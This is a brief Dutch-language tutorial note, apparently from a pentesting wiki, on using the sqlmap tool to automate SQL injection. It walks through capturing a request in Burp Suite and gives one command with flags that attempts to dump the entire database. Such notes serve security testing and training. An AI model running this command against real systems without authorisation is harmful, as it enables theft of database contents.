Tool om automatisch SQL injections uit te voeren.
- Stap 1: Intercept een request die resulteert in een database query. Dit kan bijvoorbeeld met [[Burpsuite]].
- Stap 2: Sla de volledige request op in een bestand.
- Stap 3: Start `sqlmap`:
```bash
sqlmap -r request.txt --dbms=mysql --dump
```
- `-r` - Gebruik de request file.
- `--dbms` - Vertel `sqlmap` welke Database Management System er gebruikt wordt.
- `--dump` - Probeer de volledige database te verkrijgen.